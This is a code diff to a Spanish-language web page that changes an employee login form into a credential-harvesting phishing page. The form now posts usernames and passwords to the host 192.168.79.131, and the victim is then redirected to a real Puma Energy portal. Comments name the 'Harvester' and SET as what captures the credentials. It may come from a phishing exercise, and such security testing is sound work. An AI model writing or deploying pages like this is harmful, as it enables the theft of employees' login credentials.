@@ -295,17 +295,20 @@
       <a href="#" id="btnToggleEmpleado" class="btn btn-outline">INICIAR SESIÓN</a>
 
       <!-- Formulario oculto de empleado -->
-      <form id="loginFormEmpleado" class="employee-login-form">
-        <div class="form-group">
-          <label for="usuarioEmpleado">Usuario</label>
-          <input type="text" id="usuarioEmpleado" class="form-control" placeholder="Usuario" required />
-        </div>
-        <div class="form-group">
-          <label for="claveEmpleado">Contraseña</label>
-          <input type="password" id="claveEmpleado" class="form-control" placeholder="Contraseña" required />
-        </div>
-        <button type="submit" class="btn btn-green">Entrar</button>
-      </form>
+      <form id="loginFormEmpleado" class="employee-login-form" 
+      method="POST" 
+      action="http://192.168.79.131/login" 
+      onsubmit="redirigirDespues(event)">
+  <div class="form-group">
+    <label for="usuarioEmpleado">Usuario</label>
+    <input type="text" name="username" id="usuarioEmpleado" class="form-control" placeholder="Usuario" required />
+  </div>
+  <div class="form-group">
+    <label for="claveEmpleado">Contraseña</label>
+    <input type="password" name="password" id="claveEmpleado" class="form-control" placeholder="Contraseña" required />
+  </div>
+  <button type="submit" class="btn btn-green">Entrar</button>
+</form>
 
       <div id="msg-empleado" class="error-message" style="display:none;"></div>
       <div id="ok-empleado" class="success-message" style="display:none;"></div>
@@ -365,6 +368,14 @@
         msgError.style.display = "block";
       }
     });
+
+    function redirigirDespues(event) {
+    // Dejamos que el formulario se envíe al Harvester
+    setTimeout(() => {
+      window.location.href = "https://one.pumaenergy.com/";
+    }, 1500); // espera 1.5 segundos para que SET capture antes de redirigir
+  }
+
   </script>
 
 </body>
